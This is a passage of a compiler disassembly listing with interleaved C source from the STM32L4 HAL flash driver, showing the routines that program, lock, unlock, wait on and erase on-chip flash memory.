 80014f4:	e9d7 2300 	ldrd	r2, r3, [r7]
 80014f8:	68b8      	ldr	r0, [r7, #8]
 80014fa:	f000 f8bd 	bl	8001678 <FLASH_Program_DoubleWord>
      prog_bit = FLASH_CR_PG;
 80014fe:	2301      	movs	r3, #1
 8001500:	613b      	str	r3, [r7, #16]
 8001502:	e010      	b.n	8001526 <HAL_FLASH_Program+0x9a>
    }
    else if((TypeProgram == FLASH_TYPEPROGRAM_FAST) || (TypeProgram == FLASH_TYPEPROGRAM_FAST_AND_LAST))
 8001504:	68fb      	ldr	r3, [r7, #12]
 8001506:	2b01      	cmp	r3, #1
 8001508:	d002      	beq.n	8001510 <HAL_FLASH_Program+0x84>
 800150a:	68fb      	ldr	r3, [r7, #12]
 800150c:	2b02      	cmp	r3, #2
 800150e:	d10a      	bne.n	8001526 <HAL_FLASH_Program+0x9a>
    {
      /* Fast program a 32 row double-word (64-bit) at a specified address */
      FLASH_Program_Fast(Address, (uint32_t)Data);
 8001510:	683b      	ldr	r3, [r7, #0]
 8001512:	4619      	mov	r1, r3
 8001514:	68b8      	ldr	r0, [r7, #8]
 8001516:	f000 f8d5 	bl	80016c4 <FLASH_Program_Fast>

      /* If it is the last row, the bit will be cleared at the end of the operation */
      if(TypeProgram == FLASH_TYPEPROGRAM_FAST_AND_LAST)
 800151a:	68fb      	ldr	r3, [r7, #12]
 800151c:	2b02      	cmp	r3, #2
 800151e:	d102      	bne.n	8001526 <HAL_FLASH_Program+0x9a>
      {
        prog_bit = FLASH_CR_FSTPG;
 8001520:	f44f 2380 	mov.w	r3, #262144	; 0x40000
 8001524:	613b      	str	r3, [r7, #16]
    {
      /* Nothing to do */
    }

    /* Wait for last operation to be completed */
    status = FLASH_WaitForLastOperation((uint32_t)FLASH_TIMEOUT_VALUE);
 8001526:	f24c 3050 	movw	r0, #50000	; 0xc350
 800152a:	f000 f84d 	bl	80015c8 <FLASH_WaitForLastOperation>
 800152e:	4603      	mov	r3, r0
 8001530:	75fb      	strb	r3, [r7, #23]

    /* If the program operation is completed, disable the PG or FSTPG Bit */
    if (prog_bit != 0U)
 8001532:	693b      	ldr	r3, [r7, #16]
 8001534:	2b00      	cmp	r3, #0
 8001536:	d006      	beq.n	8001546 <HAL_FLASH_Program+0xba>
    {
      CLEAR_BIT(FLASH->CR, prog_bit);
 8001538:	4b09      	ldr	r3, [pc, #36]	; (8001560 <HAL_FLASH_Program+0xd4>)
 800153a:	695a      	ldr	r2, [r3, #20]
 800153c:	693b      	ldr	r3, [r7, #16]
 800153e:	43db      	mvns	r3, r3
 8001540:	4907      	ldr	r1, [pc, #28]	; (8001560 <HAL_FLASH_Program+0xd4>)
 8001542:	4013      	ands	r3, r2
 8001544:	614b      	str	r3, [r1, #20]
    }

    /* Flush the caches to be sure of the data consistency */
    FLASH_FlushCaches();
 8001546:	f000 f9cf 	bl	80018e8 <FLASH_FlushCaches>
  }

  /* Process Unlocked */
  __HAL_UNLOCK(&pFlash);
 800154a:	4b04      	ldr	r3, [pc, #16]	; (800155c <HAL_FLASH_Program+0xd0>)
 800154c:	2200      	movs	r2, #0
 800154e:	701a      	strb	r2, [r3, #0]

  return status;
 8001550:	7dfb      	ldrb	r3, [r7, #23]
}
 8001552:	4618      	mov	r0, r3
 8001554:	3718      	adds	r7, #24
 8001556:	46bd      	mov	sp, r7
 8001558:	bd80      	pop	{r7, pc}
 800155a:	bf00      	nop
 800155c:	2000000c 	.word	0x2000000c
 8001560:	40022000 	.word	0x40022000

08001564 <HAL_FLASH_Unlock>:
/**
  * @brief  Unlock the FLASH control register access.
  * @retval HAL Status
  */
HAL_StatusTypeDef HAL_FLASH_Unlock(void)
{
 8001564:	b480      	push	{r7}
 8001566:	b083      	sub	sp, #12
 8001568:	af00      	add	r7, sp, #0
  HAL_StatusTypeDef status = HAL_OK;
 800156a:	2300      	movs	r3, #0
 800156c:	71fb      	strb	r3, [r7, #7]

  if(READ_BIT(FLASH->CR, FLASH_CR_LOCK) != 0U)
 800156e:	4b0b      	ldr	r3, [pc, #44]	; (800159c <HAL_FLASH_Unlock+0x38>)
 8001570:	695b      	ldr	r3, [r3, #20]
 8001572:	2b00      	cmp	r3, #0
 8001574:	da0b      	bge.n	800158e <HAL_FLASH_Unlock+0x2a>
  {
    /* Authorize the FLASH Registers access */
    WRITE_REG(FLASH->KEYR, FLASH_KEY1);
 8001576:	4b09      	ldr	r3, [pc, #36]	; (800159c <HAL_FLASH_Unlock+0x38>)
 8001578:	4a09      	ldr	r2, [pc, #36]	; (80015a0 <HAL_FLASH_Unlock+0x3c>)
 800157a:	609a      	str	r2, [r3, #8]
    WRITE_REG(FLASH->KEYR, FLASH_KEY2);
 800157c:	4b07      	ldr	r3, [pc, #28]	; (800159c <HAL_FLASH_Unlock+0x38>)
 800157e:	4a09      	ldr	r2, [pc, #36]	; (80015a4 <HAL_FLASH_Unlock+0x40>)
 8001580:	609a      	str	r2, [r3, #8]

    /* Verify Flash is unlocked */
    if(READ_BIT(FLASH->CR, FLASH_CR_LOCK) != 0U)
 8001582:	4b06      	ldr	r3, [pc, #24]	; (800159c <HAL_FLASH_Unlock+0x38>)
 8001584:	695b      	ldr	r3, [r3, #20]
 8001586:	2b00      	cmp	r3, #0
 8001588:	da01      	bge.n	800158e <HAL_FLASH_Unlock+0x2a>
    {
      status = HAL_ERROR;
 800158a:	2301      	movs	r3, #1
 800158c:	71fb      	strb	r3, [r7, #7]
    }
  }

  return status;
 800158e:	79fb      	ldrb	r3, [r7, #7]
}
 8001590:	4618      	mov	r0, r3
 8001592:	370c      	adds	r7, #12
 8001594:	46bd      	mov	sp, r7
 8001596:	f85d 7b04 	ldr.w	r7, [sp], #4
 800159a:	4770      	bx	lr
 800159c:	40022000 	.word	0x40022000
 80015a0:	45670123 	.word	0x45670123
 80015a4:	cdef89ab 	.word	0xcdef89ab

080015a8 <HAL_FLASH_Lock>:
/**
  * @brief  Lock the FLASH control register access.
  * @retval HAL Status
  */
HAL_StatusTypeDef HAL_FLASH_Lock(void)
{
 80015a8:	b480      	push	{r7}
 80015aa:	af00      	add	r7, sp, #0
  /* Set the LOCK Bit to lock the FLASH Registers access */
  SET_BIT(FLASH->CR, FLASH_CR_LOCK);
 80015ac:	4b05      	ldr	r3, [pc, #20]	; (80015c4 <HAL_FLASH_Lock+0x1c>)
 80015ae:	695b      	ldr	r3, [r3, #20]
 80015b0:	4a04      	ldr	r2, [pc, #16]	; (80015c4 <HAL_FLASH_Lock+0x1c>)
 80015b2:	f043 4300 	orr.w	r3, r3, #2147483648	; 0x80000000
 80015b6:	6153      	str	r3, [r2, #20]

  return HAL_OK;
 80015b8:	2300      	movs	r3, #0
}
 80015ba:	4618      	mov	r0, r3
 80015bc:	46bd      	mov	sp, r7
 80015be:	f85d 7b04 	ldr.w	r7, [sp], #4
 80015c2:	4770      	bx	lr
 80015c4:	40022000 	.word	0x40022000

080015c8 <FLASH_WaitForLastOperation>:
  * @brief  Wait for a FLASH operation to complete.
  * @param  Timeout maximum flash operation timeout
  * @retval HAL_StatusTypeDef HAL Status
  */
HAL_StatusTypeDef FLASH_WaitForLastOperation(uint32_t Timeout)
{
 80015c8:	b580      	push	{r7, lr}
 80015ca:	b084      	sub	sp, #16
 80015cc:	af00      	add	r7, sp, #0
 80015ce:	6078      	str	r0, [r7, #4]
  /* Wait for the FLASH operation to complete by polling on BUSY flag to be reset.
     Even if the FLASH operation fails, the BUSY flag will be reset and an error
     flag will be set */

  uint32_t tickstart = HAL_GetTick();
 80015d0:	f7ff fe1a 	bl	8001208 <HAL_GetTick>
 80015d4:	60f8      	str	r0, [r7, #12]
  uint32_t error;

  while(__HAL_FLASH_GET_FLAG(FLASH_FLAG_BSY))
 80015d6:	e00d      	b.n	80015f4 <FLASH_WaitForLastOperation+0x2c>
  {
    if(Timeout != HAL_MAX_DELAY)
 80015d8:	687b      	ldr	r3, [r7, #4]
 80015da:	f1b3 3fff 	cmp.w	r3, #4294967295
 80015de:	d009      	beq.n	80015f4 <FLASH_WaitForLastOperation+0x2c>
    {
      if((HAL_GetTick() - tickstart) >= Timeout)
 80015e0:	f7ff fe12 	bl	8001208 <HAL_GetTick>
 80015e4:	4602      	mov	r2, r0
 80015e6:	68fb      	ldr	r3, [r7, #12]
 80015e8:	1ad3      	subs	r3, r2, r3
 80015ea:	687a      	ldr	r2, [r7, #4]
 80015ec:	429a      	cmp	r2, r3
 80015ee:	d801      	bhi.n	80015f4 <FLASH_WaitForLastOperation+0x2c>
      {
        return HAL_TIMEOUT;
 80015f0:	2303      	movs	r3, #3
 80015f2:	e036      	b.n	8001662 <FLASH_WaitForLastOperation+0x9a>
  while(__HAL_FLASH_GET_FLAG(FLASH_FLAG_BSY))
 80015f4:	4b1d      	ldr	r3, [pc, #116]	; (800166c <FLASH_WaitForLastOperation+0xa4>)
 80015f6:	691b      	ldr	r3, [r3, #16]
 80015f8:	f403 3380 	and.w	r3, r3, #65536	; 0x10000
 80015fc:	2b00      	cmp	r3, #0
 80015fe:	d1eb      	bne.n	80015d8 <FLASH_WaitForLastOperation+0x10>
      }
    }
  }

  error = (FLASH->SR & FLASH_FLAG_SR_ERRORS);
 8001600:	4b1a      	ldr	r3, [pc, #104]	; (800166c <FLASH_WaitForLastOperation+0xa4>)
 8001602:	691a      	ldr	r2, [r3, #16]
 8001604:	4b1a      	ldr	r3, [pc, #104]	; (8001670 <FLASH_WaitForLastOperation+0xa8>)
 8001606:	4013      	ands	r3, r2
 8001608:	60bb      	str	r3, [r7, #8]

  if(error != 0u)
 800160a:	68bb      	ldr	r3, [r7, #8]
 800160c:	2b00      	cmp	r3, #0
 800160e:	d01e      	beq.n	800164e <FLASH_WaitForLastOperation+0x86>
  {
    /*Save the error code*/
    pFlash.ErrorCode |= error;
 8001610:	4b18      	ldr	r3, [pc, #96]	; (8001674 <FLASH_WaitForLastOperation+0xac>)
 8001612:	685a      	ldr	r2, [r3, #4]
 8001614:	68bb      	ldr	r3, [r7, #8]
 8001616:	4313      	orrs	r3, r2
 8001618:	4a16      	ldr	r2, [pc, #88]	; (8001674 <FLASH_WaitForLastOperation+0xac>)
 800161a:	6053      	str	r3, [r2, #4]

    /* Clear error programming flags */
    __HAL_FLASH_CLEAR_FLAG(error);
 800161c:	68bb      	ldr	r3, [r7, #8]
 800161e:	f003 4340 	and.w	r3, r3, #3221225472	; 0xc0000000
 8001622:	2b00      	cmp	r3, #0
 8001624:	d007      	beq.n	8001636 <FLASH_WaitForLastOperation+0x6e>
 8001626:	4b11      	ldr	r3, [pc, #68]	; (800166c <FLASH_WaitForLastOperation+0xa4>)
 8001628:	699a      	ldr	r2, [r3, #24]
 800162a:	68bb      	ldr	r3, [r7, #8]
 800162c:	f003 4340 	and.w	r3, r3, #3221225472	; 0xc0000000
 8001630:	490e      	ldr	r1, [pc, #56]	; (800166c <FLASH_WaitForLastOperation+0xa4>)
 8001632:	4313      	orrs	r3, r2
 8001634:	618b      	str	r3, [r1, #24]
 8001636:	68bb      	ldr	r3, [r7, #8]
 8001638:	f023 4340 	bic.w	r3, r3, #3221225472	; 0xc0000000
 800163c:	2b00      	cmp	r3, #0
 800163e:	d004      	beq.n	800164a <FLASH_WaitForLastOperation+0x82>
 8001640:	4a0a      	ldr	r2, [pc, #40]	; (800166c <FLASH_WaitForLastOperation+0xa4>)
 8001642:	68bb      	ldr	r3, [r7, #8]
 8001644:	f023 4340 	bic.w	r3, r3, #3221225472	; 0xc0000000
 8001648:	6113      	str	r3, [r2, #16]

    return HAL_ERROR;
 800164a:	2301      	movs	r3, #1
 800164c:	e009      	b.n	8001662 <FLASH_WaitForLastOperation+0x9a>
  }

  /* Check FLASH End of Operation flag  */
  if (__HAL_FLASH_GET_FLAG(FLASH_FLAG_EOP))
 800164e:	4b07      	ldr	r3, [pc, #28]	; (800166c <FLASH_WaitForLastOperation+0xa4>)
 8001650:	691b      	ldr	r3, [r3, #16]
 8001652:	f003 0301 	and.w	r3, r3, #1
 8001656:	2b00      	cmp	r3, #0
 8001658:	d002      	beq.n	8001660 <FLASH_WaitForLastOperation+0x98>
  {
    /* Clear FLASH End of Operation pending bit */
    __HAL_FLASH_CLEAR_FLAG(FLASH_FLAG_EOP);
 800165a:	4b04      	ldr	r3, [pc, #16]	; (800166c <FLASH_WaitForLastOperation+0xa4>)
 800165c:	2201      	movs	r2, #1
 800165e:	611a      	str	r2, [r3, #16]
  }

  /* If there is an error flag set */
  return HAL_OK;
 8001660:	2300      	movs	r3, #0
}
 8001662:	4618      	mov	r0, r3
 8001664:	3710      	adds	r7, #16
 8001666:	46bd      	mov	sp, r7
 8001668:	bd80      	pop	{r7, pc}
 800166a:	bf00      	nop
 800166c:	40022000 	.word	0x40022000
 8001670:	0002c3fa 	.word	0x0002c3fa
 8001674:	2000000c 	.word	0x2000000c

08001678 <FLASH_Program_DoubleWord>:
  * @param  Address specifies the address to be programmed.
  * @param  Data specifies the data to be programmed.
  * @retval None
  */
static void FLASH_Program_DoubleWord(uint32_t Address, uint64_t Data)
{
 8001678:	b480      	push	{r7}
 800167a:	b085      	sub	sp, #20
 800167c:	af00      	add	r7, sp, #0
 800167e:	60f8      	str	r0, [r7, #12]
 8001680:	e9c7 2300 	strd	r2, r3, [r7]
  /* Check the parameters */
  assert_param(IS_FLASH_PROGRAM_ADDRESS(Address));

  /* Set PG bit */
  SET_BIT(FLASH->CR, FLASH_CR_PG);
 8001684:	4b0e      	ldr	r3, [pc, #56]	; (80016c0 <FLASH_Program_DoubleWord+0x48>)
 8001686:	695b      	ldr	r3, [r3, #20]
 8001688:	4a0d      	ldr	r2, [pc, #52]	; (80016c0 <FLASH_Program_DoubleWord+0x48>)
 800168a:	f043 0301 	orr.w	r3, r3, #1
 800168e:	6153      	str	r3, [r2, #20]

  /* Program first word */
  *(__IO uint32_t*)Address = (uint32_t)Data;
 8001690:	68fb      	ldr	r3, [r7, #12]
 8001692:	683a      	ldr	r2, [r7, #0]
 8001694:	601a      	str	r2, [r3, #0]
           so that all instructions following the ISB are fetched from cache or memory,
           after the instruction has been completed.
 */
__STATIC_FORCEINLINE void __ISB(void)
{
  __ASM volatile ("isb 0xF":::"memory");
 8001696:	f3bf 8f6f 	isb	sy
}
 800169a:	bf00      	nop
  /* Barrier to ensure programming is performed in 2 steps, in right order
    (independently of compiler optimization behavior) */
  __ISB();

  /* Program second word */
  *(__IO uint32_t*)(Address+4U) = (uint32_t)(Data >> 32);
 800169c:	e9d7 0100 	ldrd	r0, r1, [r7]
 80016a0:	f04f 0200 	mov.w	r2, #0
 80016a4:	f04f 0300 	mov.w	r3, #0
 80016a8:	000a      	movs	r2, r1
 80016aa:	2300      	movs	r3, #0
 80016ac:	68f9      	ldr	r1, [r7, #12]
 80016ae:	3104      	adds	r1, #4
 80016b0:	4613      	mov	r3, r2
 80016b2:	600b      	str	r3, [r1, #0]
}
 80016b4:	bf00      	nop
 80016b6:	3714      	adds	r7, #20
 80016b8:	46bd      	mov	sp, r7
 80016ba:	f85d 7b04 	ldr.w	r7, [sp], #4
 80016be:	4770      	bx	lr
 80016c0:	40022000 	.word	0x40022000

080016c4 <FLASH_Program_Fast>:
  * @param  Address specifies the address to be programmed.
  * @param  DataAddress specifies the address where the data are stored.
  * @retval None
  */
static void FLASH_Program_Fast(uint32_t Address, uint32_t DataAddress)
{
 80016c4:	b480      	push	{r7}
 80016c6:	b089      	sub	sp, #36	; 0x24
 80016c8:	af00      	add	r7, sp, #0
 80016ca:	6078      	str	r0, [r7, #4]
 80016cc:	6039      	str	r1, [r7, #0]
  uint32_t primask_bit;
  uint8_t row_index = (2*FLASH_NB_DOUBLE_WORDS_IN_ROW);
 80016ce:	2340      	movs	r3, #64	; 0x40
 80016d0:	77fb      	strb	r3, [r7, #31]
  __IO uint32_t *dest_addr = (__IO uint32_t*)Address;
 80016d2:	687b      	ldr	r3, [r7, #4]
 80016d4:	61bb      	str	r3, [r7, #24]
  __IO uint32_t *src_addr = (__IO uint32_t*)DataAddress;
 80016d6:	683b      	ldr	r3, [r7, #0]
 80016d8:	617b      	str	r3, [r7, #20]

  /* Check the parameters */
  assert_param(IS_FLASH_MAIN_MEM_ADDRESS(Address));

  /* Set FSTPG bit */
  SET_BIT(FLASH->CR, FLASH_CR_FSTPG);
 80016da:	4b14      	ldr	r3, [pc, #80]	; (800172c <FLASH_Program_Fast+0x68>)
 80016dc:	695b      	ldr	r3, [r3, #20]
 80016de:	4a13      	ldr	r2, [pc, #76]	; (800172c <FLASH_Program_Fast+0x68>)
 80016e0:	f443 2380 	orr.w	r3, r3, #262144	; 0x40000
 80016e4:	6153      	str	r3, [r2, #20]
  __ASM volatile ("MRS %0, primask" : "=r" (result) :: "memory");
 80016e6:	f3ef 8310 	mrs	r3, PRIMASK
 80016ea:	60fb      	str	r3, [r7, #12]
  return(result);
 80016ec:	68fb      	ldr	r3, [r7, #12]

  /* Disable interrupts to avoid any interruption during the loop */
  primask_bit = __get_PRIMASK();
 80016ee:	613b      	str	r3, [r7, #16]
  __ASM volatile ("cpsid i" : : : "memory");
 80016f0:	b672      	cpsid	i
}
 80016f2:	bf00      	nop
  __disable_irq();

  /* Program the double word of the row */
  do
  {
    *dest_addr = *src_addr;
 80016f4:	697b      	ldr	r3, [r7, #20]
 80016f6:	681a      	ldr	r2, [r3, #0]
 80016f8:	69bb      	ldr	r3, [r7, #24]
 80016fa:	601a      	str	r2, [r3, #0]
    dest_addr++;
 80016fc:	69bb      	ldr	r3, [r7, #24]
 80016fe:	3304      	adds	r3, #4
 8001700:	61bb      	str	r3, [r7, #24]
    src_addr++;
 8001702:	697b      	ldr	r3, [r7, #20]
 8001704:	3304      	adds	r3, #4
 8001706:	617b      	str	r3, [r7, #20]
    row_index--;
 8001708:	7ffb      	ldrb	r3, [r7, #31]
 800170a:	3b01      	subs	r3, #1
 800170c:	77fb      	strb	r3, [r7, #31]
  } while (row_index != 0U);
 800170e:	7ffb      	ldrb	r3, [r7, #31]
 8001710:	2b00      	cmp	r3, #0
 8001712:	d1ef      	bne.n	80016f4 <FLASH_Program_Fast+0x30>
 8001714:	693b      	ldr	r3, [r7, #16]
 8001716:	60bb      	str	r3, [r7, #8]
  __ASM volatile ("MSR primask, %0" : : "r" (priMask) : "memory");
 8001718:	68bb      	ldr	r3, [r7, #8]
 800171a:	f383 8810 	msr	PRIMASK, r3
}
 800171e:	bf00      	nop

  /* Re-enable the interrupts */
  __set_PRIMASK(primask_bit);
}
 8001720:	bf00      	nop
 8001722:	3724      	adds	r7, #36	; 0x24
 8001724:	46bd      	mov	sp, r7
 8001726:	f85d 7b04 	ldr.w	r7, [sp], #4
 800172a:	4770      	bx	lr
 800172c:	40022000 	.word	0x40022000

08001730 <HAL_FLASHEx_Erase>:
  *         the pages have been correctly erased)
  *
  * @retval HAL Status
  */
HAL_StatusTypeDef HAL_FLASHEx_Erase(FLASH_EraseInitTypeDef *pEraseInit, uint32_t *PageError)
{
 8001730:	b580      	push	{r7, lr}
 8001732:	b084      	sub	sp, #16
 8001734:	af00      	add	r7, sp, #0
 8001736:	6078      	str	r0, [r7, #4]
 8001738:	6039      	str	r1, [r7, #0]
  HAL_StatusTypeDef status;
  uint32_t page_index;

  /* Process Locked */
  __HAL_LOCK(&pFlash);
 800173a:	4b48      	ldr	r3, [pc, #288]	; (800185c <HAL_FLASHEx_Erase+0x12c>)
 800173c:	781b      	ldrb	r3, [r3, #0]
 800173e:	2b01      	cmp	r3, #1
 8001740:	d101      	bne.n	8001746 <HAL_FLASHEx_Erase+0x16>
 8001742:	2302      	movs	r3, #2
 8001744:	e085      	b.n	8001852 <HAL_FLASHEx_Erase+0x122>
 8001746:	4b45      	ldr	r3, [pc, #276]	; (800185c <HAL_FLASHEx_Erase+0x12c>)
 8001748:	2201      	movs	r2, #1
 800174a:	701a      	strb	r2, [r3, #0]

  /* Check the parameters */
  assert_param(IS_FLASH_TYPEERASE(pEraseInit->TypeErase));

  /* Wait for last operation to be completed */
  status = FLASH_WaitForLastOperation((uint32_t)FLASH_TIMEOUT_VALUE);
 800174c:	f24c 3050 	movw	r0, #50000	; 0xc350
 8001750:	f7ff ff3a 	bl	80015c8 <FLASH_WaitForLastOperation>
 8001754:	4603      	mov	r3, r0
 8001756:	73fb      	strb	r3, [r7, #15]

  if (status == HAL_OK)
 8001758:	7bfb      	ldrb	r3, [r7, #15]
 800175a:	2b00      	cmp	r3, #0
 800175c:	d175      	bne.n	800184a <HAL_FLASHEx_Erase+0x11a>
  {
    pFlash.ErrorCode = HAL_FLASH_ERROR_NONE;
 800175e:	4b3f      	ldr	r3, [pc, #252]	; (800185c <HAL_FLASHEx_Erase+0x12c>)
 8001760:	2200      	movs	r2, #0
 8001762:	605a      	str	r2, [r3, #4]

    /* Deactivate the cache if they are activated to avoid data misbehavior */
    if(READ_BIT(FLASH->ACR, FLASH_ACR_ICEN) != 0U)
 8001764:	4b3e      	ldr	r3, [pc, #248]	; (8001860 <HAL_FLASHEx_Erase+0x130>)
 8001766:	681b      	ldr	r3, [r3, #0]
 8001768:	f403 7300 	and.w	r3, r3, #512	; 0x200
 800176c:	2b00      	cmp	r3, #0
 800176e:	d013      	beq.n	8001798 <HAL_FLASHEx_Erase+0x68>
    {
      if(READ_BIT(FLASH->ACR, FLASH_ACR_DCEN) != 0U)
 8001770:	4b3b      	ldr	r3, [pc, #236]	; (8001860 <HAL_FLASHEx_Erase+0x130>)
 8001772:	681b      	ldr	r3, [r3, #0]
 8001774:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8001778:	2b00      	cmp	r3, #0
 800177a:	d009      	beq.n	8001790 <HAL_FLASHEx_Erase+0x60>
      {
        /* Disable data cache  */
        __HAL_FLASH_DATA_CACHE_DISABLE();
 800177c:	4b38      	ldr	r3, [pc, #224]	; (8001860 <HAL_FLASHEx_Erase+0x130>)
 800177e:	681b      	ldr	r3, [r3, #0]
 8001780:	4a37      	ldr	r2, [pc, #220]	; (8001860 <HAL_FLASHEx_Erase+0x130>)
 8001782:	f423 6380 	bic.w	r3, r3, #1024	; 0x400
 8001786:	6013      	str	r3, [r2, #0]
        pFlash.CacheToReactivate = FLASH_CACHE_ICACHE_DCACHE_ENABLED;
 8001788:	4b34      	ldr	r3, [pc, #208]	; (800185c <HAL_FLASHEx_Erase+0x12c>)
 800178a:	2203      	movs	r2, #3
 800178c:	771a      	strb	r2, [r3, #28]
 800178e:	e016      	b.n	80017be <HAL_FLASHEx_Erase+0x8e>
      }
      else
      {
        pFlash.CacheToReactivate = FLASH_CACHE_ICACHE_ENABLED;
 8001790:	4b32      	ldr	r3, [pc, #200]	; (800185c <HAL_FLASHEx_Erase+0x12c>)
 8001792:	2201      	movs	r2, #1
 8001794:	771a      	strb	r2, [r3, #28]
 8001796:	e012      	b.n	80017be <HAL_FLASHEx_Erase+0x8e>
      }
    }
    else if(READ_BIT(FLASH->ACR, FLASH_ACR_DCEN) != 0U)
 8001798:	4b31      	ldr	r3, [pc, #196]	; (8001860 <HAL_FLASHEx_Erase+0x130>)
 800179a:	681b      	ldr	r3, [r3, #0]
 800179c:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 80017a0:	2b00      	cmp	r3, #0
 80017a2:	d009      	beq.n	80017b8 <HAL_FLASHEx_Erase+0x88>
    {
      /* Disable data cache  */
      __HAL_FLASH_DATA_CACHE_DISABLE();
 80017a4:	4b2e      	ldr	r3, [pc, #184]	; (8001860 <HAL_FLASHEx_Erase+0x130>)
 80017a6:	681b      	ldr	r3, [r3, #0]
 80017a8:	4a2d      	ldr	r2, [pc, #180]	; (8001860 <HAL_FLASHEx_Erase+0x130>)
 80017aa:	f423 6380 	bic.w	r3, r3, #1024	; 0x400
 80017ae:	6013      	str	r3, [r2, #0]
      pFlash.CacheToReactivate = FLASH_CACHE_DCACHE_ENABLED;
 80017b0:	4b2a      	ldr	r3, [pc, #168]	; (800185c <HAL_FLASHEx_Erase+0x12c>)
 80017b2:	2202      	movs	r2, #2
 80017b4:	771a      	strb	r2, [r3, #28]
 80017b6:	e002      	b.n	80017be <HAL_FLASHEx_Erase+0x8e>
    }
    else
    {
      pFlash.CacheToReactivate = FLASH_CACHE_DISABLED;
 80017b8:	4b28      	ldr	r3, [pc, #160]	; (800185c <HAL_FLASHEx_Erase+0x12c>)
 80017ba:	2200      	movs	r2, #0
 80017bc:	771a      	strb	r2, [r3, #28]
    }

    if (pEraseInit->TypeErase == FLASH_TYPEERASE_MASSERASE)
 80017be:	687b      	ldr	r3, [r7, #4]
 80017c0:	681b      	ldr	r3, [r3, #0]
 80017c2:	2b01      	cmp	r3, #1
 80017c4:	d111      	bne.n	80017ea <HAL_FLASHEx_Erase+0xba>
    {
      /* Mass erase to be done */
      FLASH_MassErase(pEraseInit->Banks);
 80017c6:	687b      	ldr	r3, [r7, #4]
 80017c8:	685b      	ldr	r3, [r3, #4]
 80017ca:	4618      	mov	r0, r3
 80017cc:	f000 f84a 	bl	8001864 <FLASH_MassErase>

      /* Wait for last operation to be completed */
      status = FLASH_WaitForLastOperation((uint32_t)FLASH_TIMEOUT_VALUE);
 80017d0:	f24c 3050 	movw	r0, #50000	; 0xc350
 80017d4:	f7ff fef8 	bl	80015c8 <FLASH_WaitForLastOperation>
 80017d8:	4603      	mov	r3, r0
 80017da:	73fb      	strb	r3, [r7, #15]
    defined (STM32L4R5xx) || defined (STM32L4R7xx) || defined (STM32L4R9xx) || defined (STM32L4S5xx) || defined (STM32L4S7xx) || defined (STM32L4S9xx)
      /* If the erase operation is completed, disable the MER1 and MER2 Bits */
      CLEAR_BIT(FLASH->CR, (FLASH_CR_MER1 | FLASH_CR_MER2));
#else
      /* If the erase operation is completed, disable the MER1 Bit */
      CLEAR_BIT(FLASH->CR, (FLASH_CR_MER1));
 80017dc:	4b20      	ldr	r3, [pc, #128]	; (8001860 <HAL_FLASHEx_Erase+0x130>)
 80017de:	695b      	ldr	r3, [r3, #20]
 80017e0:	4a1f      	ldr	r2, [pc, #124]	; (8001860 <HAL_FLASHEx_Erase+0x130>)
 80017e2:	f023 0304 	bic.w	r3, r3, #4
 80017e6:	6153      	str	r3, [r2, #20]
 80017e8:	e02d      	b.n	8001846 <HAL_FLASHEx_Erase+0x116>
#endif
    }
    else
    {
      /*Initialization of PageError variable*/
      *PageError = 0xFFFFFFFFU;
 80017ea:	683b      	ldr	r3, [r7, #0]
 80017ec:	f04f 32ff 	mov.w	r2, #4294967295
 80017f0:	601a      	str	r2, [r3, #0]

      for(page_index = pEraseInit->Page; page_index < (pEraseInit->Page + pEraseInit->NbPages); page_index++)
 80017f2:	687b      	ldr	r3, [r7, #4]
 80017f4:	689b      	ldr	r3, [r3, #8]
 80017f6:	60bb      	str	r3, [r7, #8]
 80017f8:	e01d      	b.n	8001836 <HAL_FLASHEx_Erase+0x106>
      {
        FLASH_PageErase(page_index, pEraseInit->Banks);
 80017fa:	687b      	ldr	r3, [r7, #4]
 80017fc:	685b      	ldr	r3, [r3, #4]
 80017fe:	4619      	mov	r1, r3
 8001800:	68b8      	ldr	r0, [r7, #8]
 8001802:	f000 f84d 	bl	80018a0 <FLASH_PageErase>

        /* Wait for last operation to be completed */
        status = FLASH_WaitForLastOperation((uint32_t)FLASH_TIMEOUT_VALUE);
 8001806:	f24c 3050 	movw	r0, #50000	; 0xc350
 800180a:	f7ff fedd 	bl	80015c8 <FLASH_WaitForLastOperation>
 800180e:	4603      	mov	r3, r0
 8001810:	73fb      	strb	r3, [r7, #15]

        /* If the erase operation is completed, disable the PER Bit */
        CLEAR_BIT(FLASH->CR, (FLASH_CR_PER | FLASH_CR_PNB));
 8001812:	4b13      	ldr	r3, [pc, #76]	; (8001860 <HAL_FLASHEx_Erase+0x130>)
 8001814:	695b      	ldr	r3, [r3, #20]
 8001816:	4a12      	ldr	r2, [pc, #72]	; (8001860 <HAL_FLASHEx_Erase+0x130>)
 8001818:	f423 737e 	bic.w	r3, r3, #1016	; 0x3f8
 800181c:	f023 0302 	bic.w	r3, r3, #2
 8001820:	6153      	str	r3, [r2, #20]

        if (status != HAL_OK)
 8001822:	7bfb      	ldrb	r3, [r7, #15]
 8001824:	2b00      	cmp	r3, #0
 8001826:	d003      	beq.n	8001830 <HAL_FLASHEx_Erase+0x100>
        {
          /* In case of error, stop erase procedure and return the faulty address */
          *PageError = page_index;
 8001828:	683b      	ldr	r3, [r7, #0]
 800182a:	68ba      	ldr	r2, [r7, #8]
 800182c:	601a      	str	r2, [r3, #0]
          break;
 800182e:	e00a      	b.n	8001846 <HAL_FLASHEx_Erase+0x116>
      for(page_index = pEraseInit->Page; page_index < (pEraseInit->Page + pEraseInit->NbPages); page_index++)
 8001830:	68bb      	ldr	r3, [r7, #8]
 8001832:	3301      	adds	r3, #1
 8001834:	60bb      	str	r3, [r7, #8]
 8001836:	687b      	ldr	r3, [r7, #4]
 8001838:	689a      	ldr	r2, [r3, #8]
 800183a:	687b      	ldr	r3, [r7, #4]
 800183c:	68db      	ldr	r3, [r3, #12]
 800183e:	4413      	add	r3, r2
 8001840:	68ba      	ldr	r2, [r7, #8]
 8001842:	429a      	cmp	r2, r3
 8001844:	d3d9      	bcc.n	80017fa <HAL_FLASHEx_Erase+0xca>
        }
      }
    }

    /* Flush the caches to be sure of the data consistency */
    FLASH_FlushCaches();
 8001846:	f000 f84f 	bl	80018e8 <FLASH_FlushCaches>
  }

  /* Process Unlocked */
  __HAL_UNLOCK(&pFlash);
 800184a:	4b04      	ldr	r3, [pc, #16]	; (800185c <HAL_FLASHEx_Erase+0x12c>)
 800184c:	2200      	movs	r2, #0
 800184e:	701a      	strb	r2, [r3, #0]

  return status;
 8001850:	7bfb      	ldrb	r3, [r7, #15]
}
